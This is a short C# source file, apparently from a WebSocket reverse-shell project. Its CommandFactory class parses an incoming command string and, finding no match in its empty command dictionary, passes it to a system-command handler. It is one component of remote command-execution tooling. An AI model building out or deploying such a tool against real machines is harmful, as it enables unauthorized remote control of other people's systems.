﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Input;
using WebSocketReverseShellDotNet.service.commands;
using WebSocketReverseShellDotNet.utils;

namespace WebSocketReverseShellDotNet.service.factory
{
    internal class CommandFactory
    {
        public static Command createCommand(String command)
        {
            List<String> commands = DataManuplationUtil.StringToList(command, " ");

            String firstArgument = commands[0].ToLower();

            Dictionary<string, Command> commandsList = new Dictionary<string, Command>(StringComparer.OrdinalIgnoreCase);


            ;
            // If not found, redirect to the system command
            return commandsList.TryGetValue(firstArgument, out Command value)
                ? value
                : new SystemCommand();
        }
    }
}
